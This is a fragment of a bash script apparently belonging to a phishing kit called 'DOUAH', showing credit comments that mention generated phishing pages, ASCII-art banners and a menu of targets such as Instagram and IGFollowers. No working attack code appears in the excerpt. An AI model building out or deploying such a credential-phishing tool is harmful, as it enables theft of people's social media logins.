#!/bin/bash
# DOUAH v1.1  
# Coded by: @douahanas (https://github.com/anasdh/douah.py) Give me the credits if copy ANY part from this code. Don't be NOOB!!
# Upgraded by: @anas_Dh (https://github.com/anasdh/douah.py)
# Credits (Copyright)
# Phishing Pages generated by ANAS.Dh (https://github.com/An0nUD4Y):
...
| (_| | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \\n"
 \__,_|_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\n"
                 ...
                 \e[1;94m CODED BY:  @anasdouah\e[0m\n"


printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom                                    
...
printf "                                                \e[1;94m UPGRADED BY: @anas-douah\e[0m\n"
